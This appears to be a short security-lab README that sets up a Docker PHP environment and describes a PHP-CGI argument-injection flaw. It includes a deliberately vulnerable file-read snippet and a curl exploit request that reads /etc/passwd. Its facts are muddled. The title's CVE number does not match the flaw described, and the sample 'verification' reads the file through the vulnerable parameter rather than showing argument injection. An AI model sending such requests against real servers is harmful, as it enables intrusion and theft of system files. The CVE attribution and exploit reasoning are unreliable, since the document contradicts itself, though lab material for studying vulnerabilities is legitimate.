# CVE-2024-2961 - PHP CGI Argument Injection

## Environment

Start the environment with:

```bash
docker compose up -d
```

Access the server at:

```
http://localhost:8080/index.php?file=index.php
```

The vulnerable PHP code:

```php
<?php
echo "File contents: ";
echo file_get_contents($_GET['file']);
?>
```

PHP Version: 8.3.4 (vulhub/php:8.3.4-apache)

---

## Vulnerability

When PHP runs in CGI mode, an attacker can inject command-line arguments via query parameters.  
By injecting `-d allow_url_include=on -d auto_prepend_file=php://input`, arbitrary code execution is possible.

This issue affects PHP 5 ~ 8.3.5.

---

## Exploit

First, verify the vulnerability by reading a system file:

```bash
curl "http://localhost:8080/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input&file=/etc/passwd"
```

Expected result: the contents of `/etc/passwd` are displayed.  
If successful, this confirms that command-line arguments were injected into php-cgi.

---
